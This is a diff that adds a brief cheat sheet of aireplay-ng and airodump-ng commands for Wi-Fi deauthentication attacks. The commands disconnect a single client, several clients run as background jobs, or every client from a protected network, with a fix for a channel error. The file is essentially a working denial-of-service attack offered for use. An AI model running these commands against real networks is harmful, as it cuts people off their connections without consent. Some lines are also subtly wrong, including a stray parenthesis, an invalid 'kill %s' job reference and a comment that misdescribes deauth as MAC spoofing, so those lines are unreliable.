@@ -1,0 +1,23 @@
+# Changes MAC address to MAC of some client (to pretend to be him) and send a request to disconnect.
+aireplay-ng --deauth [DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
+
+# Deauthenticating multiple clients from protected WIFI networks
+# run the command in the background and redirect output to /dev/null
+$ aireplay-ng --deauth [DeauthPackets] -a [NetworkMac] -c [FirstTargetMac] [Interface] &> /dev/null &
+$ aireplay-ng --deauth [DeauthPackets] -a [NetworkMac] -c [SecondTargetMac] [Interface] &> /dev/null &
+# see running jobs
+$ jobs
+# stop all running jobs of aireplay-ng
+$ killall aireplay-ng)
+# kill a specific job, the first one
+$ kill %s
+$ jobs
+
+# Deauthenticating all clients from protected WIFI networks
+# Run the same aireplay-ng command. Set the BSSID of target network. Omit the -c argument (the client argument).
+aireplay-ng --deauth [DeauthPackets] -a [NetworkMac] [Interface] 
+# Could cause an ERROR: No such BSSID available.
+# SOLUTION: problem is with channel, run airodump-ng againts specific channel 
+airodump-ng --bssid [NetworkMAC] --channel [ChannelID] [Interface] 
+# and try it again in new terminal window
+aireplay-ng --deauth [DeauthPackets] -a [NetworkMac] [Interface] 
